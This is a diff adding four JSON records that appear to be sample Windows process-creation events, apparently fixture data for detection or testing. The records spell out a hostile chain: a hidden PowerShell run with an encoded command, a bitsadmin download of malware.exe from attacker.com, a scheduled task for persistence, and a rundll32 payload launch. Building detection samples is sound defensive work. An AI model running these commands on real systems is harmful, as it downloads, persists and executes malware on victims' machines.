@@ -1,0 +1,4 @@
+{"event_id": 1, "event_data": {"Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "CommandLine": "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtACgAWwBDAG8AbgB2AGUAcgB0AF0AOgA6AEYAcgBvAG0AQgBhAHMAZQA2ADQAUwB0AHIAaQBuAGcAKAAiAEgA..."}}
+{"event_id": 1, "event_data": {"Image": "C:\\Windows\\System32\\bitsadmin.exe", "CommandLine": "bitsadmin /transfer myJob http://attacker.com/malware.exe C:\\windows\\temp\\malware.exe"}}
+{"event_id": 1, "event_data": {"Image": "C:\\Windows\\System32\\schtasks.exe", "CommandLine": "schtasks /create /tn \"SecurityScan\" /tr \"C:\\windows\\temp\\malware.exe\" /sc minute /mo 1"}}
+{"event_id": 1, "event_data": {"Image": "C:\\Windows\\System32\\rundll32.exe", "CommandLine": "rundll32.exe C:\\windows\\temp\\malware.dll,StartRoutine"}}
